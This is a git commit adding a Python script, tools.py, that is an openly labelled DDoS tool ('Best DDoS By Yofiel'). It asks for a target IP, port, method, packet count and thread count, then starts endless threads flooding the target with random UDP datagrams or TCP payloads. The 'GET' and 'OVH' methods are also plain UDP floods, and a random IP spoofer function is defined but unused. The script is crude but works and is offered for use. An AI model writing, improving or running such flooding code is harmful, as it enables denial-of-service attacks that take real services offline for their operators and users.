6a99743a27726a13829e73eb514fc7666ce69dbb
Z4R13R <99081331+Zarier22@users.noreply.github.com>
2023-01-03 21:52:02 +0700

    Add files via upload

---
+++ tools.py
@@ -0,0 +1,180 @@
+import random
+import socket
+import threading
+import time
+import os,sys
+import random, socket, threading
+import os
+import getpass
+ 
+print("\033[95m>> CODED : Yofiel. ") 
+print("\033[95m>>>> TOOLS PRIVATE YOFIEL")
+print("\033[91m                                       METHOD: UDP-TCP-GET-OVH              ")
+ip = str(input("  \033[0;31mIP:"))
+port = int(input(" \033[0;32mPort:"))
+choice = str(input(" \033[94mMethods: "))
+times = int(input(" \033[0;31mPacket:"))
+threads = int(input(" \033[0;32mThreads:"))
+ 
+def run():
+    data = random._urandom(577)
+    i = random.choice(("[+]","[-]"))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            addr = (str(ip),int(port))
+            for x in range(times):
+                s.sendto(data,addr)
+            print(i +" Yofiel ")
+        except:
+            print("[!] ERROR SERVER TIME OUT")
+            
+def run2():
+    data = random._urandom(818)
+    i = random.choice(("[+]","[-]"))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            addr = (str(ip),int(port))
+            for x in range(times):
+                s.sendto(data,addr)
+            print(i +" Yofiel ")
+        except:
+            print("[!] ERROR SERVER TIME OUT")
+            
+def run3():
+    data = random._urandom(818)
+    i = random.choice(("[+]","[-]"))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            addr = (str(ip),int(port))
+            for x in range(times):
+                s.sendto(data,addr)
+            print(i +" Yofiel ")
+        except:
+            print("[!] ERROR SERVER TIME OUT")
+            
+def run4():
+    data = random._urandom(17)
+    i = random.choice(("[+]","[-]"))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            addr = (str(ip),int(port))
+            for x in range(times):
+                s.sendto(data,addr)
+            print(i +" Yofiel Attack You Server")
+        except:
+            print("[!] ERROR SERVER TIME OUT")
+            
+def run5():
+    data = random._urandom(1872637)
+    i = random.choice(("[+]","[-]"))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            addr = (str(ip),int(port))
+            for x in range(times):
+                s.sendto(data,addr)
+            print(i +" XinZz. ")
+        except:
+            print("[!] ERROR SERVER TIME OUT")
+
+def run6():
+    data = random._urandom(146734)
+    i = random.choice(("[+]","[-]"))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            addr = (str(ip),int(port))
+            for x in range(times):
+                s.sendto(data,addr)
+            print(i +" XinZz. ")
+        except:
+            print("[!] ERROR SERVER TIME OUT")
+
+def run7():
+    data = random._urandom(818)
+    i = random.choice(("[•]","[•]","[•]"))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print(i +"Yofiel ")
+        except:
+            s.close()
+            print("Best DDoS By Yofiel!!!")
+
+def spoofer():
+    addr = [192, 168, 0, 1]
+    d = '.'
+    addr[0] = str(random.randrange(11, 197))
+    addr[1] = str(random.randrange(0, 255))
+    addr[2] = str(random.randrange(0, 255))
+    addr[3] = str(random.randrange(2, 254))
+    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
+    return assemebled
+
+for y in range(threads):
+    if choice == 'UDP':
+        th = threading.Thread(target = run)
+        th.start()
+        th = threading.Thread(target = run2)
+        th.start()
+        th = threading.Thread(target = run3)
+        th.start()
+    if choice == 'udp':
+        th = threading.Thread(target = run)
+        th.start()
+        th = threading.Thread(target = run2)
+        th.start()
+        th = threading.Thread(target = run3)
+        th.start()
+    if choice == 'TCP':
+        th = threading.Thread(target = run)
+        th.start()
+        th = threading.Thread(target = run2)
+        th.start()
+    if choice == 'tcp':
+        th = threading.Thread(target = run)
+        th.start()
+        th = threading.Thread(target = run2)
+        th.start()
+    if choice == 'GET':
+        th = threading.Thread(target = run4)
+        th.start()
+        th = threading.Thread(target = run5)
+        th.start()
+    if choice == 'get':
+        th = threading.Thread(target = run4)
+        th.start()
+        th = threading.Thread(target = run5)
+        th.start()
+    if choice == 'OVH':
+        th = threading.Thread(target = run4)
+        th.start()
+        th = threading.Thread(target = run5)
+        th.start()
+    if choice == 'ovh':
+        th = threading.Thread(target = run4)
+        th.start()
+        th = threading.Thread(target = run5)
+        th.start()
+else:
+        th = threading.Thread(target = run)
+        th.start()
+        th = threading.Thread(target = run2)
+        th.start()
+        th = threading.Thread(target = run3)
+        th.start()
+        th = threading.Thread(target = run4)
+        th.start()
+        th = threading.Thread(target = run5)
+        th.start()
+        th = threading.Thread(target = run6)
+        th.start()
+        th = threading.Thread(target = run7)
